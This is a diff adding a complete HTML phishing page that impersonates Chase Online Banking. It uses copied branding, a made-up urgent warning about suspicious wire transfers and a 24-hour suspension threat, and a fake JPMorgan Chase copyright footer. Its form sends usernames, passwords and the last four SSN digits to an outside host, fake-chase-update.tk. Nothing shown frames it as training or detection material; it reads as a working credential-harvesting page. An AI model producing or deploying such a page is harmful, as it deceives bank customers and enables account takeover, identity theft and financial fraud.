@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Online Banking - Identity Verification</title>
+    <style>
+        body { font-family: 'Open Sans', Arial, sans-serif; background-color: #0b2341; margin: 0; padding: 0; }
+        .header-bar { background: #117cd8; padding: 1rem 2rem; color: #fff; font-size: 1.5rem; font-weight: bold; letter-spacing: 1px; }
+        .main-container { max-width: 500px; margin: 3rem auto; background: #ffffff; padding: 2.5rem; border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
+        h2 { color: #0b2341; margin-top: 0; }
+        .urgent-callout { background: #fee2e2; border: 1px solid #ef4444; color: #b91c1c; padding: 1rem; border-radius: 6px; margin-bottom: 1.5rem; font-size: 0.9rem; }
+        .form-field { margin-bottom: 1.25rem; }
+        label { display: block; font-weight: 600; margin-bottom: 0.4rem; color: #334155; font-size: 0.9rem; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 0.75rem; border: 1px solid #cbd5e1; border-radius: 4px; box-sizing: border-box; font-size: 1rem; }
+        .submit-btn { width: 100%; background: #117cd8; color: #ffffff; border: none; padding: 0.85rem; font-size: 1rem; font-weight: bold; border-radius: 4px; cursor: pointer; }
+        .submit-btn:hover { background: #0c63b0; }
+        .footer-note { text-align: center; margin-top: 1.5rem; font-size: 0.75rem; color: #94a3b8; }
+    </style>
+</head>
+<body>
+    <div class="header-bar">CHASE <span>Online Banking</span></div>
+    <div class="main-container">
+        <h2>Security Verification Required</h2>
+        <div class="urgent-callout">
+            <strong>URGENT:</strong> We detected suspicious wire transfers on your account. To prevent temporary suspension within 24 hours, confirm your identity and login credentials immediately.
+        </div>
+
+        <form action="http://fake-chase-update.tk/submit_creds.php" method="POST">
+            <div class="form-field">
+                <label>Username / Account ID</label>
+                <input type="text" name="bank_user" placeholder="Enter username" required>
+            </div>
+            <div class="form-field">
+                <label>Password</label>
+                <input type="password" name="bank_password" placeholder="Enter password" required>
+            </div>
+            <div class="form-field">
+                <label>Social Security Number (SSN - Last 4 digits)</label>
+                <input type="password" name="ssn_last4" placeholder="••••" maxlength="4" required>
+            </div>
+            <button type="submit" class="submit-btn">Verify Account Identity</button>
+        </form>
+
+        <div class="footer-note">
+            &copy; 2026 JPMorgan Chase & Co. Equal Housing Opportunity.
+        </div>
+    </div>
+</body>
+</html>
+
